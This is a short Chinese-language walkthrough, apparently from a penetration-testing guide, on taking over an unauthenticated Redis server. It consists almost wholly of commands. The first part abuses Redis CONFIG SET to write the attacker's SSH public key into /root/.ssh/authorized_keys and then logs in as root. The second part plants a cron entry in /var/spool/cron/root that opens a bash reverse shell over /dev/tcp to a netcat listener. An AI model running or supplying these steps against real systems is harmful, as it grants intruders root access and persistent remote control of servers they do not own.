## 写ssh-keygen公钥登陆

*   首先在本地生产公私钥文件
    

```
1.  `ssh-keygen –t rsa`
    
```

![](../Images/f4969df30c7d7d52518eee1af1f91958.png)

*   公钥写入 key.txt 文件
    

```
1.  `(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt`
    
```

![](../Images/b91be379beecb94fea10752e4f948160.png)

*   连接 Redis 写入文件
    

```
1.  `cat test.txt | redis-cli -h 192.168.1.103 -x set crackit`
    
2.  `redis-cli -h 192.168.1.103`
    
3.  `config set dir /root/.ssh/`
    
4.  `config get dir`
    
5.  `config set dbfilename "authorized_keys"`
    
6.  `save`
    
```

![](../Images/3bae6319da3a420cdd976173eb74f4b1.png)

*   私钥登陆
    

```
1.  `ssh -i id_rsa root@192.168.1.103`
    
```

![](../Images/aba9cbe689f965389230d9693bf7690f.png)

## 利用计划任务执行命令反弹shell

*   监听一个端口
    

```
1.  `nc -lvvp 6666`
    
```

![](../Images/1a8fdd3349767056c5bd30030c281ef8.png)

*   写入反弹shell
    

```
1.  `set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.1.101/6666 0>&1\n\n"`
    
2.  `config set dir /var/spool/cron/`
    
3.  `config set dbfilename root`
    
4.  `save`
    
```

![](../Images/d626be7e7d11a0f7acae142369ff593a.png)
